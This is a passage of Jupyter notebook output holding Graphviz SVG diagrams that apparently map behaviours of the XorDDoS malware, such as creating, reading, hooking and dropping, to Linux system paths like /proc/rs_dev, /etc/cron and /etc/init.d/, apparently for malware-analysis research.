      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"221pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 221.26 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 217.26,-127 217.26,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"100.26\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"100.26\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"100.26\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"100.26\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M39.06,-93.99C25.44,-88.79 12.6,-80.92 4.26,-69 -12.39,-45.21 26.03,-31.92 59.11,-25.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"59.97,-28.53 69.14,-23.22 58.66,-21.65 59.97,-28.53\"/>\n<text text-anchor=\"middle\" x=\"41.26\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M100.26,-86.8C100.26,-75.16 100.26,-59.55 100.26,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"103.76,-46.18 100.26,-36.18 96.76,-46.18 103.76,-46.18\"/>\n<text text-anchor=\"middle\" x=\"127.76\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M136.39,-88.87C144.32,-83.77 151.7,-77.22 156.26,-69 164.13,-54.8 151.08,-42.58 135.61,-33.78\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"136.85,-30.48 126.36,-29 133.64,-36.7 136.85,-30.48\"/>\n<text text-anchor=\"middle\" x=\"185.76\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffeeb1f0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Ms.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"2962pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 2961.76 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 2957.76,-127 2957.76,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1425.46\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1425.46\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"193.46\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"193.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.25,-103.54C1056.02,-101.61 33.01,-93.13 9.46,-69 -34.77,-23.66 89.92,-18.17 155.72,-18.28\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"156.1,-21.78 166.12,-18.35 156.14,-14.78 156.1,-21.78\"/>\n<text text-anchor=\"middle\" x=\"32.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.fetch</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.17,-103.44C1065.16,-101.19 100.74,-91.87 78.46,-69 52.21,-42.06 113.76,-28.71 156.56,-22.88\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"157.23,-26.32 166.71,-21.58 156.35,-19.38 157.23,-26.32\"/>\n<text text-anchor=\"middle\" x=\"106.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.06,-103.31C1075.93,-100.68 178.3,-90.42 157.46,-69 148.25,-59.53 156.3,-47.56 167.11,-37.71\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"169.39,-40.36 174.85,-31.28 164.92,-34.98 169.39,-40.36\"/>\n<text text-anchor=\"middle\" x=\"182.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.create</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge20\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.1,-103.56C1091.39,-101.87 281.08,-94.52 231.46,-69 221.03,-63.63 212.65,-53.94 206.45,-44.51\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"209.31,-42.48 201.17,-35.7 203.3,-46.08 209.31,-42.48\"/>\n<text text-anchor=\"middle\" x=\"252.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">44.read</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge21\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.2,-104.02C1109.83,-103.74 395.97,-100.27 296.46,-69 284.82,-65.34 284.2,-59.8 273.46,-54 258.14,-45.73 240.47,-37.83 225.63,-31.64\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"226.93,-28.39 216.35,-27.83 224.27,-34.87 226.93,-28.39\"/>\n<text text-anchor=\"middle\" x=\"333.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">9.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge33\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.09,-104.65C1142.94,-105.83 588.57,-105.46 409.46,-69 391.26,-65.3 388.3,-59.15 370.46,-54 322.67,-40.19 266.05,-30.05 229.95,-24.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"230.31,-20.85 219.89,-22.77 229.23,-27.76 230.31,-20.85\"/>\n<text text-anchor=\"middle\" x=\"431.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.drop</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"722.46\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"722.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1347.83,-104.08C1124.12,-103.94 492.05,-100.72 461.46,-69 456.83,-64.2 457.07,-59.02 461.46,-54 490.05,-21.32 619.88,-17.87 684.99,-18.26\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"685.2,-21.76 695.23,-18.36 685.27,-14.76 685.2,-21.76\"/>\n<text text-anchor=\"middle\" x=\"486.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.create</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.18,-103.83C1136.88,-103 563.41,-98.07 535.46,-69 490.69,-22.44 618.58,-17.61 685.08,-18.09\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"685.15,-21.59 695.19,-18.21 685.24,-14.59 685.15,-21.59\"/>\n<text text-anchor=\"middle\" x=\"556.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.read</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.09,-103.58C1147.8,-102.11 626.08,-95.73 600.46,-69 572.69,-40.02 640.19,-27.28 685.49,-22.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"686.04,-25.6 695.61,-21.06 685.3,-18.63 686.04,-25.6\"/>\n<text text-anchor=\"middle\" x=\"637.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">8.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.3,-103.12C1165.5,-100.65 719.64,-92.27 697.46,-69 689.9,-61.07 693.87,-50.4 700.68,-40.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"703.51,-43.03 707.17,-33.08 698.11,-38.58 703.51,-43.03\"/>\n<text text-anchor=\"middle\" x=\"711.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.run</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge19\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.14,-104.21C1181.39,-104.07 798.97,-100.3 749.46,-69 740.89,-63.58 734.85,-54.45 730.69,-45.46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"733.84,-43.93 726.88,-35.95 727.34,-46.53 733.84,-43.93\"/>\n<text text-anchor=\"middle\" x=\"772.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">40.fetch</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge26\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.12,-104.47C1207.27,-104.51 914.6,-100.62 818.46,-69 806.87,-65.19 806.1,-59.98 795.46,-54 782.06,-46.46 766.77,-38.97 753.66,-32.86\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"755.11,-29.68 744.56,-28.68 752.19,-36.04 755.11,-29.68\"/>\n<text text-anchor=\"middle\" x=\"844.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.contain</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge28\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.24,-103.71C1221.59,-102.43 975.56,-96.37 893.46,-69 881.88,-65.14 881.68,-58.81 870.46,-54 834.1,-38.41 789.6,-29.08 758.95,-24.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"759.15,-20.51 748.72,-22.41 758.05,-27.42 759.15,-20.51\"/>\n<text text-anchor=\"middle\" x=\"921.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge40\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1347.88,-104.46C1259.72,-103.45 1112.03,-97.09 988.46,-69 970.35,-64.88 967.41,-58.78 949.46,-54 883.64,-36.49 804.6,-26.76 759.28,-22.23\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"759.35,-18.72 749.05,-21.24 758.67,-25.69 759.35,-18.72\"/>\n<text text-anchor=\"middle\" x=\"1008.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.relate</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1064.46\" cy=\"-18\" rx=\"57.69\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1064.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/rs_dev</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1348.66,-102.56C1241.04,-99.73 1056.13,-91.61 1035.46,-69 1028.41,-61.29 1031.89,-51.58 1038.51,-42.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1041.33,-44.86 1045.25,-35.02 1036.05,-40.27 1041.33,-44.86\"/>\n<text text-anchor=\"middle\" x=\"1053.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.use</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge36\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1349.26,-101.52C1269.96,-97.87 1151.81,-89.18 1111.46,-69 1099.92,-63.23 1089.74,-53.4 1081.82,-43.97\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1084.41,-41.6 1075.48,-35.9 1078.91,-45.92 1084.41,-41.6\"/>\n<text text-anchor=\"middle\" x=\"1132.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">17.have</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1395.46\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1395.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1347.95,-104.59C1278.96,-103.26 1185.34,-96.25 1161.46,-69 1157.07,-63.99 1157.11,-59.05 1161.46,-54 1185.67,-25.91 1292.13,-20.03 1352.78,-19.01\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1352.86,-22.51 1362.82,-18.88 1352.77,-15.51 1352.86,-22.51\"/>\n<text text-anchor=\"middle\" x=\"1182.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.have</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1350.54,-100.53C1301.32,-96.5 1243.22,-87.79 1227.46,-69 1191.88,-26.57 1291.77,-19.2 1352.52,-18.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1352.65,-21.98 1362.63,-18.42 1352.61,-14.98 1352.65,-21.98\"/>\n<text text-anchor=\"middle\" x=\"1250.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">18.name</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1362.92,-94.24C1334.74,-88.43 1305.88,-80.03 1297.46,-69 1279.32,-45.23 1320.01,-31.84 1354.37,-25.01\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1355.09,-28.44 1364.29,-23.18 1353.82,-21.55 1355.09,-28.44\"/>\n<text text-anchor=\"middle\" x=\"1320.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">11.hook</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1387.44,-89.23C1379.08,-84.13 1371.29,-77.49 1366.46,-69 1361.27,-59.88 1365.16,-49.87 1371.58,-41.21\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1374.42,-43.27 1378.29,-33.41 1369.12,-38.71 1374.42,-43.27\"/>\n<text text-anchor=\"middle\" x=\"1384.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">28.call</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge24\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1419.39,-86.8C1415.22,-74.97 1409.59,-59.03 1404.84,-45.58\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1408.05,-44.15 1401.42,-35.89 1401.45,-46.48 1408.05,-44.15\"/>\n<text text-anchor=\"middle\" x=\"1441.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.contain</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge25\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1457,-88.34C1471.07,-79.15 1482.81,-66.84 1474.46,-54 1465.82,-40.72 1450.86,-32.44 1436.27,-27.29\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1436.89,-23.82 1426.31,-24.21 1434.82,-30.51 1436.89,-23.82\"/>\n<text text-anchor=\"middle\" x=\"1502.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.check</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge29\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1480.49,-92.28C1503.21,-86.22 1525.81,-78.18 1532.46,-69 1536.37,-63.6 1536.55,-59.27 1532.46,-54 1520.81,-39 1473.2,-29.35 1437.35,-24.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1437.51,-20.55 1427.12,-22.62 1436.54,-27.48 1437.51,-20.55\"/>\n<text text-anchor=\"middle\" x=\"1566.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">12.provide</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge41\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1482.55,-92.7C1533.9,-82.53 1601.34,-69.15 1601.46,-69 1605.69,-63.85 1605.76,-59.09 1601.46,-54 1580.96,-29.72 1492.03,-22.28 1437.94,-20\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1438.07,-16.51 1427.94,-19.62 1437.8,-23.5 1438.07,-16.51\"/>\n<text text-anchor=\"middle\" x=\"1623.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.use</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1872.46\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1872.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1481.34,-92.43C1491.35,-90.5 1501.7,-88.61 1511.46,-87 1571.18,-77.13 1586.86,-79.55 1646.46,-69 1709.92,-57.77 1782.56,-40.99 1827.98,-30.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1828.91,-33.39 1837.8,-27.63 1827.26,-26.59 1828.91,-33.39\"/>\n<text text-anchor=\"middle\" x=\"1744.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.fetch</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1479.88,-92.17C1490.33,-90.2 1501.2,-88.36 1511.46,-87 1626.28,-71.74 1661.64,-105.82 1771.46,-69 1783.03,-65.12 1783.75,-59.85 1794.46,-54 1807.02,-47.14 1821.19,-40.48 1833.96,-34.85\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1835.63,-37.94 1843.42,-30.75 1832.85,-31.52 1835.63,-37.94\"/>\n<text text-anchor=\"middle\" x=\"1822.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge34\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1479.87,-92.03C1490.31,-90.08 1501.19,-88.28 1511.46,-87 1548.89,-82.33 1819.43,-90.44 1850.46,-69 1858.28,-63.59 1863.35,-54.75 1866.63,-46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1870,-46.92 1869.61,-36.33 1863.32,-44.86 1870,-46.92\"/>\n<text text-anchor=\"middle\" x=\"1888.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.create</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge37\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1479.4,-92.05C1489.98,-90.07 1501.04,-88.25 1511.46,-87 1533.93,-84.3 1902.81,-85.35 1918.46,-69 1928.09,-58.93 1919.04,-47.51 1906.5,-38.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1908.15,-35.02 1897.91,-32.29 1904.22,-40.81 1908.15,-35.02\"/>\n<text text-anchor=\"middle\" x=\"1944.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.read</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge38\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1479.39,-92.01C1489.98,-90.03 1501.03,-88.23 1511.46,-87 1536.75,-84.02 1951.81,-87.36 1969.46,-69 1988.94,-48.74 1953.27,-35.17 1919.82,-27.34\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1920.56,-23.92 1910.04,-25.19 1919.05,-30.75 1920.56,-23.92\"/>\n<text text-anchor=\"middle\" x=\"2012.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">7.resolv.conf</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2174.46\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2174.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1479.39,-91.95C1489.97,-89.98 1501.03,-88.2 1511.46,-87 1631.19,-73.27 1935.66,-94.42 2053.46,-69 2083.73,-62.47 2116.05,-48.73 2139.66,-37.3\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2141.49,-40.31 2148.9,-32.74 2138.39,-34.03 2141.49,-40.31\"/>\n<text text-anchor=\"middle\" x=\"2122.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">21.pass</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1479.38,-91.91C1489.97,-89.95 1501.03,-88.17 1511.46,-87 1546.64,-83.05 2118.46,-87.8 2148.46,-69 2156.99,-63.66 2162.86,-54.54 2166.83,-45.55\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2170.17,-46.61 2170.43,-36.01 2163.62,-44.13 2170.17,-46.61\"/>\n<text text-anchor=\"middle\" x=\"2187.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">22.delete</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge27\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1478.92,-91.98C1489.64,-89.98 1500.87,-88.17 1511.46,-87 1550.4,-82.69 2189.11,-97.06 2216.46,-69 2225.59,-59.63 2217.96,-48.55 2206.82,-39.21\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2208.8,-36.31 2198.71,-33.06 2204.57,-41.89 2208.8,-36.31\"/>\n<text text-anchor=\"middle\" x=\"2243.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.drop</text>\n</g>\n<!-- 9 -->\n<g id=\"node10\" class=\"node\">\n<title>9</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2401.46\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2401.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1478.92,-91.96C1489.64,-89.96 1500.87,-88.16 1511.46,-87 1679.17,-68.57 2104.92,-101.55 2270.46,-69 2288,-65.55 2328.5,-49.61 2359.87,-36.65\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2361.38,-39.81 2369.27,-32.73 2358.69,-33.34 2361.38,-39.81\"/>\n<text text-anchor=\"middle\" x=\"2347.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.perform</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge32\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1478.91,-91.94C1489.64,-89.94 1500.87,-88.15 1511.46,-87 1559.41,-81.8 2339.34,-95.78 2379.46,-69 2387.37,-63.72 2392.46,-54.91 2395.72,-46.14\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2399.11,-47.03 2398.69,-36.45 2392.42,-44.99 2399.11,-47.03\"/>\n<text text-anchor=\"middle\" x=\"2416.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">27.install</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge35\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1478.91,-91.92C1489.64,-89.93 1500.87,-88.14 1511.46,-87 1537.26,-84.22 2427.29,-87.52 2445.46,-69 2454.54,-59.74 2447.23,-49 2436.14,-39.86\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2438.12,-36.97 2428.01,-33.82 2433.95,-42.59 2438.12,-36.97\"/>\n<text text-anchor=\"middle\" x=\"2469.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.add</text>\n</g>\n<!-- 11 -->\n<g id=\"node12\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2535.46\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2535.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1478.91,-91.92C1489.64,-89.92 1500.87,-88.14 1511.46,-87 1565.72,-81.19 2444.22,-92.5 2493.46,-69 2504.59,-63.69 2513.84,-53.87 2520.8,-44.34\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2523.87,-46.04 2526.54,-35.79 